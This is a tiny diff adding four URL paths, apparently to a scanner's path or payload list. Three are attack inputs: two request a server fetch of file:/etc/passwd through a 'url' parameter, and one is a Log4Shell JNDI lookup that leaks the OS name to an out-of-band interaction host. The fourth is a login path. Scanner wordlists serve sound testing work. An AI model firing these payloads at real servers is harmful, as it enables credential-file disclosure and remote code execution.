@@ -1,0 +1,4 @@
+/api/geojson?url=file:/etc/passwd
+/api/geojson?url=file:///etc/passwd
+/api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}
+/auth/login
